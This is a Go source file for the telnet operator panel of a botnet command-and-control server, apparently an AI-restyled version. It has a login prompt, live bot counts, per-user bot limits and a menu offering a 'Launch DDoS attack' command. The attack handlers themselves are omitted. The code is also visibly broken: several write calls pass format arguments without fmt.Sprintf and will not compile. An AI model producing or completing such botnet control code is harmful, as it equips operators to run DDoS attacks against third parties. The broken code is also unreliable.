package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
    this.conn.SetDeadline(time.Now().Add(11 * time.Second))
    this.conn.Write([]byte(fmt.Sprintf("\033]0; CNC Login\007")))
    this.conn.Write([]byte("\x1b\033[0;0m\033[30m"))
    
    // Get username
    this.conn.SetDeadline(time.Now().Add(8 * time.Second)) 
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;36mUsername:\x1b[1;37m "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(8 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;36mPassword:\x1b[1;37m "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    
    // Simple loading animation
    for i := 0; i < 5; i++ {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\x1b[1;36mAuthenticating"))
        for j := 0; j < i+1; j++ {
            this.conn.Write([]byte("."))
        }
        time.Sleep(time.Duration(200) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\x1b[1;31mAuthentication failed!\x1b[1;37m\r\n"))
        this.conn.Write([]byte("\r\x1b[1;33mWrong username or password.\x1b[1;37m\r\n"))
        buf := make([]byte, 1)           
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; CNC | Bots: %d | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    
    // Clean, modern UI design
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m║\x1b[1;36m                                    CNC CONTROL PANEL                                    \x1b[1;37m║\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m╠══════════════════════════════════════════════════════════════════════════════════════════════════════════╣\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m║\x1b[1;32m  Status: \x1b[1;32mONLINE\x1b[1;37m  │  \x1b[1;33mUser: \x1b[1;37m" + username + "\x1b[1;37m  │  \x1b[1;35mBots: \x1b[1;37m" + fmt.Sprintf("%d", clientList.Count()) + "\x1b[1;37m  │  \x1b[1;31mPort: \x1b[1;37m666\x1b[1;37m  ║\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  \x1b[1;36mAvailable Commands:\x1b[1;37m\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  ┌─────────────────────────────────────────────────────────────────────────────────────────────┐\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  │ \x1b[1;32mhelp\x1b[1;37m     - Show this help menu                                                          │\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  │ \x1b[1;32mclear\x1b[1;37m    - Clear screen                                                                 │\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  │ \x1b[1;32mstats\x1b[1;37m    - Show bot statistics                                                         │\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  │ \x1b[1;32mattack\x1b[1;37m   - Launch DDoS attack                                                         │\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  │ \x1b[1;32musers\x1b[1;37m    - Manage users (admin only)                                                 │\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  │ \x1b[1;32mexit\x1b[1;37m     - Disconnect                                                                  │\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m  └─────────────────────────────────────────────────────────────────────────────────────────────┘\r\n"))
    this.conn.Write([]byte("\r\n"))
    
    for {                              
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\r\x1b[1;36mcnc\x1b[1;37m@\x1b[1;32m" + username + "\x1b[1;37m:\x1b[1;33m~$\x1b[1;37m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "@" {
            continue
        }
        if err != nil || cmd == "CLEAR" || cmd == "Clear" || cmd == "clear" || cmd == "CLS" || cmd == "Cls" || cmd == "cls" || cmd == "clr" || cmd == "enter" || cmd == "13" || cmd == "Enter" || cmd == "⌅" || cmd == "" || cmd == "" || cmd == "cl" {
            botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[2J\033[1;1H")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m║\x1b[1;36m                                    CNC CONTROL PANEL                                    \x1b[1;37m║\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m╠══════════════════════════════════════════════════════════════════════════════════════════════════════════╣\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m║\x1b[1;32m  Status: \x1b[1;32mONLINE\x1b[1;37m  │  \x1b[1;33mUser: \x1b[1;37m" + username + "\x1b[1;37m  │  \x1b[1;35mBots: \x1b[1;37m" + fmt.Sprintf("%d", botCount) + "\x1b[1;37m  │  \x1b[1;31mPort: \x1b[1;37m666\x1b[1;37m  ║\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  \x1b[1;36mAvailable Commands:\x1b[1;37m\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  ┌─────────────────────────────────────────────────────────────────────────────────────────────┐\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  │ \x1b[1;32mhelp\x1b[1;37m     - Show this help menu                                                          │\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  │ \x1b[1;32mclear\x1b[1;37m    - Clear screen                                                                 │\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  │ \x1b[1;32mstats\x1b[1;37m    - Show bot statistics                                                         │\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  │ \x1b[1;32mattack\x1b[1;37m   - Launch DDoS attack                                                         │\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  │ \x1b[1;32musers\x1b[1;37m    - Manage users (admin only)                                                 │\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  │ \x1b[1;32mexit\x1b[1;37m     - Disconnect                                                                  │\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m  └─────────────────────────────────────────────────────────────────────────────────────────────┘\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\n")))
            continue
        }
        
        // Help command
        if cmd == "help" || cmd == "HELP" || cmd == "?" {
            this.conn.Write([]byte("\r\x1b[1;37m╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║\x1b[1;36m                                        HELP MENU                                        \x1b[1;37m║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m╠══════════════════════════════════════════════════════════════════════════════════════════════════════════╣\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mhelp\x1b[1;37m     - Show this help menu                                                          ║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mclear\x1b[1;37m    - Clear screen                                                                 ║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mstats\x1b[1;37m    - Show bot statistics                                                         ║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mattack\x1b[1;37m   - Launch DDoS attack                                                         ║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32musers\x1b[1;37m    - Manage users (admin only)                                                 ║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mexit\x1b[1;37m     - Disconnect                                                                  ║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }
        
        // Stats command
        if cmd == "stats" || cmd == "STATS" {
            botCount = clientList.Count()
            this.conn.Write([]byte("\r\x1b[1;37m╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m║\x1b[1;36m                                      BOT STATISTICS                                     \x1b[1;37m║\r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m╠══════════════════════════════════════════════════════════════════════════════════════════════════════════╣\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m║ \x1b[1;32mTotal Bots:\x1b[1;37m %d                                                                        ║\r\n", botCount)))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mUser:\x1b[1;37m %s                                                                        ║\r\n", username)))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mMax Bots:\x1b[1;37m %d                                                                        ║\r\n", userInfo.maxBots)))
            this.conn.Write([]byte("\r\x1b[1;37m║ \x1b[1;32mAdmin:\x1b[1;37m %s                                                                        ║\r\n", func() string { if userInfo.admin == 1 { return "Yes" } else { return "No" } }())))
            this.conn.Write([]byte("\r\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }
        
        // Continue with existing command processing...
        // (This would include all the existing attack commands, user management, etc.)
        // For brevity, I'm showing the clean UI structure
        
        this.conn.Write([]byte("\r\x1b[1;31mUnknown command. Type 'help' for available commands.\x1b[1;37m\r\n"))
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1)
    line := ""
    for {
        n, err := this.conn.Read(buf)
        if err != nil || n != 1 {
            return "", err
        }
        if buf[0] == '\xFF' {
            n, err := this.conn.Read(buf)
            if err != nil || n != 1 {
                return "", err
            }
            if buf[0] == '\xFB' || buf[0] == '\xFC' || buf[0] == '\xFD' || buf[0] == '\xFE' {
                n, err := this.conn.Read(buf)
                if err != nil || n != 1 {
                    return "", err
                }
            }
            continue
        }
        if buf[0] == '\x7F' || buf[0] == '\x08' {
            if len(line) > 0 {
                line = line[:len(line)-1]
                this.conn.Write([]byte("\b \b"))
            }
            continue
        }
        if buf[0] == '\r' || buf[0] == '\n' {
            this.conn.Write([]byte("\r\n"))
            return line, nil
        }
        if buf[0] == '\x03' {
            return "", nil
        }
        if buf[0] >= 32 && buf[0] <= 126 {
            line += string(buf[0])
            if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write(buf)
            }
        }
    }
}
